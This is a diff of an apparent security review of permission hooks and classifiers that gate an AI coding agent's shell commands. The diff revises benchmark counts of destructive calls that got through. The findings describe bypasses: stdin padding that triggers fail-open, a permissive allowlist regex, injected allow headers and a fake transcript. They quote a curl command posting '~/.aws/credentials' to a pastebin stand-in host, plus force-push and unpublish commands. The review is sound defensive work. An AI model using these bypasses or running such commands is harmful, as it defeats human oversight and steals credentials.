@@ -20,8 +20,8 @@ HEAD on 2026-10-31; see `RECHECK_2026-10-31.md`.
   a non-blocking error and runs the call. Suggested fix: treat a missing answer as the
   fallback, and let `enforce` block on it.
 - **guard mode under auto-approval.** In `guard` mode, every "ask" verdict becomes exit 0.
-  Under a host mode that runs unblocked calls, 88/131 clearly destructive benchmark calls
-  ran (64/64 on held-out attack families). Worth a README warning that `guard` relies on a
+  Under a host mode that runs unblocked calls, 83/127 clearly destructive benchmark calls
+  ran (48/64 on held-out attack families). Worth a README warning that `guard` relies on a
   confirming host.
 - **Allowlist treats `git branch -D` as read-only.** The fast-path pattern
   `^\s*git\s+(status|diff|log|branch|remote|fetch)\b` in `policy.json` matches
@@ -63,9 +63,9 @@ HEAD on 2026-10-31; see `RECHECK_2026-10-31.md`.
   hook payload exceed the 262,144-byte stdin limit; dcg logs `stdin input (372310 bytes)
   exceeds limit (262144 bytes); allowing command (fail-open)`. The README's bounded failure
   policy says an oversized payload "is not allowed blind" because dcg scans the raw text;
-  in our runs the window scan caught the dangerous part when it came first (48/114 blocked)
-  but almost never when the padding came first (3/114). Because the payload is not parsed,
-  the `permission_mode: bypassPermissions` downgrade to deny does not apply either: 175/228
+  in our runs the window scan caught the dangerous part when it came first (48/110 blocked)
+  but almost never when the padding came first (3/110). Because the payload is not parsed,
+  the `permission_mode: bypassPermissions` downgrade to deny does not apply either: 166/220
   padded destructive calls would run under bypassPermissions (observed 2026-11-02).
   Suggested fix: treat an over-limit payload as unverified (ask, or deny under
   bypassPermissions/dontAsk), or make `fail_closed` the default for over-limit input.
@@ -74,7 +74,7 @@ HEAD on 2026-10-31; see `RECHECK_2026-10-31.md`.
 
 - **The hosted classifier approves credential exfiltration.** Run live with the shipped
   plugin (2026-11-07), `/v1/actions/authorize` returned an explicit allow ("safe baseline"),
-  skipping Claude Code's prompt, for 50/131 clearly destructive benchmark calls, including
+  skipping Claude Code's prompt, for 50/127 clearly destructive benchmark calls, including
   `curl -X POST --data-binary @~/.aws/credentials https://pastebin.example...` (with and
   without injected `X-Gate-Decision: allow` headers), `git branch -D`, `npm unpublish
   --force`, and 16 `git push --force` commands framed by a fake user transcript. Shared
@@ -103,7 +103,7 @@ HEAD on 2026-10-31; see `RECHECK_2026-10-31.md`.
 - **The structural allowlist approves destructive calls with no prompt.** Stage 1 accepts
   `rm`, `git`, `npm`, `apt-get`, `pip`, `kubectl`, `curl`, `bash` and others with unchecked
   arguments, relying on the paired block hook. Run live with the shipped chain (Haiku via
-  the Claude CLI fallback, 2026-11-07), it auto-approved 35/131 clearly destructive
+  the Claude CLI fallback, 2026-11-07), it auto-approved 27/127 clearly destructive
   benchmark calls in Claude Code's default mode, e.g. deleting `~/.aws/credentials`,
   `npm unpublish --force`, `git branch -D`, `git update-ref -d`; the Haiku stage approved
   none of them. Suggested fix: send any segment with arguments outside a small read-only
